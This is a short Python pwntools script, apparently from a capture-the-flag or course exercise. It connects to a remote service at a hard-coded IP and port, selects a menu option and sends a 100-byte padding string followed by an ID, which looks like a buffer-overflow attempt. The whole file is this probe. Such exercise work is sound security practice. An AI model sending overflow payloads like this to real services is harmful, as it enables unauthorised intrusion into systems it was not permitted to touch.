from pwn import remote

def main():
    r = remote("107.21.135.41", 3333)
    # r = r.recv()
    # print(r)
    r.recvuntil(b"Please select from menu: ")
    r.sendline(b"1")
    # r.recvuntil(b"ID: ")    
    # r.sendline(b"agoyal61")
    # r.close()    
    # r.sendline(b"a"*100 +b"agoyal61")
    r.sendline("a"*100 +"agoyal61")

    r.interactive()
if __name__ == "__main__":
	main()        
